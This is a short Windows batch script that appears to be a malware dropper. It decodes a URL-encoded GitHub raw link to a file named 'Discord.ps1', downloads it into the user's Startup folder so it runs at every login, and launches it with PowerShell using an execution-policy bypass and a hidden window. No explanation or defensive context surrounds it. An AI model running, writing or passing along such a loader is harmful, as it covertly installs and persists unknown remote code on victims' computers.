@echo off
setlocal
set "encoded=https%3A%2F%2Fraw.githubusercontent.com%2Fcoolman6969-ui%2Fturtle-rap%2Frefs%2Fheads%2Fmain%2FDiscord.ps1"
for /f "delims=" %%A in ('powershell -NoProfile -Command "[System.Uri]::UnescapeDataString('%encoded%')"') do set "url=%%A"
set "path=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Discord.ps1"
curl -L -o "%path%" "%url%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%path%"